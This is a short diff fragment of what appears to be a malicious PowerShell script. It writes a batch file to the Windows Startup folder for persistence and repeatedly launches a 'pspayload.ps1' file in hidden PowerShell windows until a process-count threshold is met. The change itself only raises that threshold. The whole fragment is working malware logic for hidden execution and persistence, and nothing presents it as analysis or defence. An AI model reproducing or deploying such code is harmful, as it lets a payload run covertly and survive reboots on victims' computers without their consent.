@@ -52,4 +52,4 @@ start "" "powershell" -windowstyle hidden "~\pspayload.ps1"
 $cmdstr | set-content "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\psrunner.bat" -Encoding Ascii
 do{
     cmd.exe /c 'start "" "powershell" -windowstyle hidden "~\pspayload.ps1"'
-}while((Get-Process powershell).length -le 2)
+}while((Get-Process powershell).length -le 3)
